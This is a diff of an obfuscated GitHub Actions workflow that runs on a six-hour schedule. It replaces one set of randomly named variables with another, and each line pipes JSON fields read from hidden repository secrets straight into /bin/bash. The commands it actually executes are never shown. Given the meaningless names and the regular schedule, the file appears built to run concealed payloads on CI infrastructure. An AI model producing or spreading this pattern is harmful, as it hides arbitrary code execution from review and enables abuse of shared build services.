@@ -3,20 +3,26 @@ name: xushengtian4175
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
-jobs:  # 7477
+    - cron: '4 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xushengtian4175
         env:
-          f7884: ${{ secrets.f7884 }}
+          gq0440: ${{ secrets.gq0440 }}
         run: |
-          echo $f7884 | jq -r .qk446 | /bin/bash
-          echo $cfsqg08997 | jq -r .clwt70926 | /bin/bash
-          echo $cd5323 | jq -r .n412 | /bin/bash
-          echo $uk1333 | jq -r .tsasy71401 | /bin/bash
-          echo $gxmr137 | jq -r .g82182 | /bin/bash
-          echo $irptk2 | jq -r .igelp3 | /bin/bash
+          echo $gq0440 | jq -r .sud655 | /bin/bash
+          echo $ucgqs452 | jq -r .x733 | /bin/bash
+          echo $cm72740 | jq -r .lxrwh69270 | /bin/bash
+          echo $wqz21 | jq -r .x02163 | /bin/bash
+          echo $oxr6 | jq -r .tw27668 | /bin/bash
+          echo $hglzb3 | jq -r .kyjla71 | /bin/bash
+          echo $yvzt7569 | jq -r .jsba526 | /bin/bash
+          echo $dh09393 | jq -r .dp64 | /bin/bash
+          echo $ejymo5611 | jq -r .d56024 | /bin/bash
+          echo $ngd7379 | jq -r .sikqf705 | /bin/bash
+          echo $jn1 | jq -r .rwwp98 | /bin/bash
 
